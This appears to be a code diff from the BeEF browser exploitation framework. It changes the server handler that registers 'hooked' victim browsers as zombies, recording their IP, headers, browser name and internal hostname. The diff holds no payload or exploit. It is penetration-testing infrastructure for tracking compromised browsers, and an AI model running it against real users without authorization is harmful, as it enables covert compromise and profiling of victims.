@@ -23,13 +23,28 @@ module BeEF
     # allow the hooked browser to send back results using POST.
     #
     def do_POST(request, response)
+
+      response.body = ''
       
       # validate hook session value
       session_id = request.query['BEEFHOOK'] || nil
       raise WEBrick::HTTPStatus::BadRequest, "session id is invalid" if not Filter.is_valid_hook_session_id?(session_id)
-      hooked_browser = HB.first(:session => session_id, :has_init => false)
-      raise WEBrick::HTTPStatus::BadRequest, "Invalid beef session id: the hooked browser cannot be found in the database" if hooked_browser.nil?
+      hooked_browser = HB.first(:session => session_id)
+      return if not hooked_browser.nil? # browser is already registered with framework
+
+      # create the structure repesenting the hooked browser
+      zombie = BeEF::Models::Zombie.new(:ip => request.peeraddr[3], :session => session_id)
+      zombie.firstseen = Time.new.to_i
+      zombie.httpheaders = request.header.to_json
+      @guard.synchronize {      
+        zombie.save # the save needs to be conducted before any hooked browser specific logging
+      }
       
+      # add a log entry for the newly hooked browser
+      log_zombie_domain = zombie.domain
+      log_zombie_domain = "(blank)" if log_zombie_domain.nil? or log_zombie_domain.empty?
+      BeEF::Logger.instance.register('Zombie', "#{zombie.ip} just joined the horde from the domain: #{log_zombie_domain}", "#{zombie.id}") 
+            
       # get and store browser name
       browser_name = get_param(request.query, 'BrowserName')
       raise WEBrick::HTTPStatus::BadRequest, "Invalid browser name" if not Filter.is_valid_browsername?(browser_name)
@@ -83,13 +98,8 @@ module BeEF
         BD.set(session_id, 'InternalHostname', internal_hostname)
       end
       
-      # init details have been returned so set flag and save
-      hooked_browser.has_init = true
-      @guard.synchronize {      
-        hooked_browser.save
-      }
-    
-      response.body = ''
+
+
     end
     
     # returns a selected parameter from the query string.
